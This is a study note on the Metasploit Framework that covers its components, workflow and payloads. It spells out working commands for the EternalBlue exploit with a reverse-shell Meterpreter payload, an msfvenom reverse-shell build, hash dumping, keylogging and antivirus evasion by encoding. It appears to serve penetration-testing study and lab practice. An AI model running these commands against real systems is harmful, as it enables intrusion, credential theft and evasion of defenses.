The **Metasploit Framework** is a powerful open-source platform for **developing, testing, and executing exploits** against remote targets. It is widely used by **penetration testers**, **red teamers**, and **security researchers** for **exploitation, post-exploitation, and payload delivery**.

---

## 🎯 Purpose of Metasploit

- Launch and test **exploits**
- Generate **payloads** for remote access
- Conduct **post-exploitation tasks**
- Perform **vulnerability verification**
- Automate **penetration testing workflows**

> Developed and maintained by Rapid7, Metasploit is a cornerstone of offensive security.

---

## 🧱 Core Components

| Component        | Description                                           |
|------------------|-------------------------------------------------------|
| **Exploits**      | Code that targets vulnerabilities to gain access     |
| **Payloads**      | Code executed on the target after exploitation        |
| **Encoders**      | Obfuscate payloads to avoid detection                 |
| **Auxiliary Modules** | Scanning, fuzzing, and other non-exploit tasks  |
| **Post Modules**  | Post-exploitation tools (e.g., hash dumping)         |
| **Meterpreter**   | Powerful payload with extended capabilities           |
| **Listeners/Handlers** | Receive incoming connections from payloads      |

---

## ⚙️ Installation

- Pre-installed in **Kali Linux**
- Manual install:
```bash
sudo apt install metasploit-framework
```

Launch with:
```
msfconsole
```

## 🔧 Basic Workflow

1. **Start msfconsole**
```
msfconsole
```

2. **Search for module**
```
search windows/smb
```

3. **Use a module**
```
use exploit/windows/smb/ms17_010_eternalblue
```

4. **Set options**
```
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
```

5. **Run the exploit**
```
exploit
```

## 🧰 Common Payloads

|Payload Type|Description|
|---|---|
|`windows/meterpreter/reverse_tcp`|Interactive Meterpreter shell|
|`linux/x86/meterpreter_reverse_tcp`|Linux Meterpreter payload|
|`cmd/windows/reverse_powershell`|Executes PowerShell commands remotely|
|`generic/shell_reverse_tcp`|Simple command shell|
|`php/meterpreter_reverse_tcp`|For webshell injections in PHP|

---

## 📦 Auxiliary Modules

Use these for scanning, enumeration, and info gathering:
```
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/ssh/ssh_version
```

## 🛠 Post-Exploitation Modules

Once access is gained:
```
use post/windows/gather/hashdump
use post/multi/recon/local_exploit_suggester
```
Meterpreter offers `getuid`, `hashdump`, `screenshot`, `keyscan_start`, and more.

## 🧠 Encoders & Obfuscation

To avoid AV detection:
```
set ENCODER x86/shikata_ga_nai
```
Use `msfvenom` to create encoded standalone payloads:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > payload.exe
```

## 🧪 Example: EternalBlue Exploit (MS17-010)

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

## 🛡 Legal & Ethical Use

- Always have **written permission**
- Only use in **lab environments** or **authorized engagements**
- Follow **responsible disclosure** if vulnerabilities are found

---

## 🔗 Related Topics

- [[Exploit Development]]
- [[Payload Creation with msfvenom]]
- [[Post-Exploitation Techniques]]
- [[Penetration Testing]]
- [[Privilege Escalation]]
- [[Red Team vs Blue Team]]

---

## 🏷 Suggested Tags

#metasploit #penetration_testing #offensive_security #exploit_dev #payloads #meterpreter #red_team

---

## ✅ To Do

-  Practice with 3 different Metasploit exploits in a lab
-  Use msfvenom to create and test custom payloads
-  Chain exploit + privilege escalation + hashdump
-  Document modules used and effectiveness



